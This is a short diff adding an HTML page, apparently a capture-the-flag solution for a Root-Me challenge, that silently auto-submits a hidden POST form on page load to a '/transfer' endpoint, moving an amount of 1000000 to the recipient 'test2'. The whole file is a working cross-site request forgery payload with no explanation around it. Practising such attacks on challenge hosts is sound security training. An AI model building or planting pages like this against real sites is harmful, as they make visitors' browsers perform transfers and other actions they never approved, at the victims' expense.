@@ -1,0 +1,8 @@
+<html>
+<body onload="document.forms[0].submit()">
+  <form action="https://instance-019d8c6d-c87e-7031-bc42-b1f3474432a1.challenges.root-me.pro/transfer" method="POST">
+    <input type="hidden" name="recipient" value="test2">
+    <input type="hidden" name="amount" value="1000000">
+  </form>
+</body>
+</html>
